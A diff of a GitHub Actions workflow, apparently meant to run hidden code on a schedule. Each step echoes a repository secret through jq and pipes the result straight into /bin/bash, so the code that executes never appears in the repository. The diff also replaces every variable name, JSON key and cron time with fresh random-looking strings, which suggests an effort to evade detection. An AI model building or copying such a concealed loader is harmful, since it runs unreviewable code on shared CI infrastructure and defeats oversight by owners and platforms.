@@ -1,26 +1,27 @@
 name: shuzhigufeng
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 1/6 * * *'
+    - cron: '26 3/6 * * *'
 
-jobs:  # 31979
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: shuzhigufeng
         env:
-          na88: ${{ secrets.na88 }}
+          thqkm34: ${{ secrets.thqkm34 }}
         run: |
-          echo $na88 | jq -r .exahv6 | /bin/bash
-          echo $vnfrn024 | jq -r .gdunw94297 | /bin/bash
-          echo $u918 | jq -r .blc7 | /bin/bash
-          echo $a00 | jq -r .lfvjk64004 | /bin/bash
-          echo $i34653 | jq -r .vngc5425 | /bin/bash
-          echo $ti3670 | jq -r .lhja7721 | /bin/bash
-          echo $a05303 | jq -r .tme20 | /bin/bash
-          echo $eowx38 | jq -r .gakge67 | /bin/bash
-          echo $ezt40209 | jq -r .qv78049 | /bin/bash
-          echo $nmq23 | jq -r .bsi25 | /bin/bash
+          echo $thqkm34 | jq -r .toab6 | /bin/bash
+          echo $pwg7644 | jq -r .ydqv73 | /bin/bash
+          echo $kxn65331 | jq -r .sag84 | /bin/bash
+          echo $dso7180 | jq -r .zuxc17 | /bin/bash
+          echo $tnrb14146 | jq -r .n3808 | /bin/bash
+          echo $jwgp9950 | jq -r .evgam74 | /bin/bash
+          echo $roh8 | jq -r .la9 | /bin/bash
+          echo $dr988 | jq -r .put09534 | /bin/bash
+          echo $x88 | jq -r .fnk27 | /bin/bash
 
